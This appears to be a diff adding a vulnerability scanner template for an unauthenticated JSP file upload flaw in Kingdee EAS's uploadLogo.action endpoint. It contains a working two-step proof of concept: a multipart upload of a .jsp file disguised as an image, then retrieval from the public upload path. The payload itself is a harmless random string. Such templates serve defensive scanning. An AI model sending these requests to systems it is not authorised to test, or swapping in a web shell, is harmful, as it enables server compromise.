@@ -1,0 +1,63 @@
+id: kingdee-eas-uploadLogo-file-upload
+info:
+  name: Kingdee EAS uploadLogo.action File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    This template detects a file upload vulnerability in the Kingdee EAS uploadLogo.action endpoint.
+
+variables:
+  rand_str: '{{rand_text_alphanumeric(16)}}'
+
+flow: http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - '{{BaseURL}}/plt_portal/setting/uploadLogo.action'
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rand_str}}
+    body: |
+      ------WebKitFormBoundary{{rand_str}}
+      Content-Disposition: form-data; name="upload"; filename="test.jsp"
+      Content-Type: image/jpeg
+
+      {{rand_str}}
+      ------WebKitFormBoundary{{rand_str}}--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "gp.uploadLogoSuccess("
+    extractors:
+      - type: regex
+        name: filename
+        group: 1
+        regex:
+          - '"nullLogo","(.*?).jsp"'
+        internal: true
+
+  - id: verify-upload
+    method: GET
+    path:
+      - '{{BaseURL}}/portal/res/file/upload/{{filename}}.jsp'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '{{rand_str}}'
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
